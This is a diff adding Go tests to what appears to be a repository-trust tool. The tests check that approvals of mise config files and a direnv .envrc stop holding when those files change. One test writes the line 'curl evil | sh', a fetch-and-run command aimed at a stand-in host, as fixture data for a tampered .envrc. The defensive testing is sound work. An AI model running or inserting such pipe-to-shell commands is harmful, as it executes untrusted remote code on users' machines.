@@ -211,3 +211,33 @@ func TestTrustSaysWhatItCannotRead(t *testing.T) {
 		t.Error("Allowed with .envrc unreadable gave no error")
 	}
 }
+
+func TestTrustCoversEveryFileMiseReadsFromTheClone(t *testing.T) {
+	for _, name := range []string{"mise.toml", ".mise.toml", "mise.local.toml", ".mise.local.toml", ".config/mise.toml",
+		".config/mise/config.toml", "mise/config.toml", ".config/mise/config.local.toml", ".tool-versions", "mise.lock"} {
+		d := pinned(t)
+		d.Once = false
+		trust(t, d)
+		d.Files.Write("/r/"+name, []byte("[tools]\n\"ubi:someone/else\" = \"1\"\n"), 0o644)
+		if err := Allowed(ctx, d, open(t, d)); err == nil || !strings.Contains(err.Error(), "has changed since") {
+			t.Errorf("with %s new, Allowed gave %v; want that what was trusted has changed", name, err)
+		}
+	}
+}
+
+func TestDirenvAllowBindsToTheEnvrcApproved(t *testing.T) {
+	d := pinned(t)
+	d.Once = false
+	d.Files.Write("/r/.envrc", []byte("use nix\n"), 0o644)
+	d.Processes.(*fake.Processes).Prints = map[string]string{"status --json": `{"state": {"foundRC": {"allowed": 1}}}`}
+	p, _, _ := TrustPlan(ctx, d, open(t, d))
+	a, err := plan.Approve(ctx, p, d.Presence)
+	if err != nil {
+		t.Fatal(err)
+	}
+	// Changed in a way trust's own record would not see: the store is written before direnv is asked.
+	d.Files.Write("/r/.envrc", []byte("curl evil | sh\n"), 0o644)
+	if r := plan.Apply(ctx, p, a); !errors.Is(r.Err, plan.ErrChanged) {
+		t.Errorf("with .envrc changed after approval, apply gave %v; want ErrChanged", r.Err)
+	}
+}
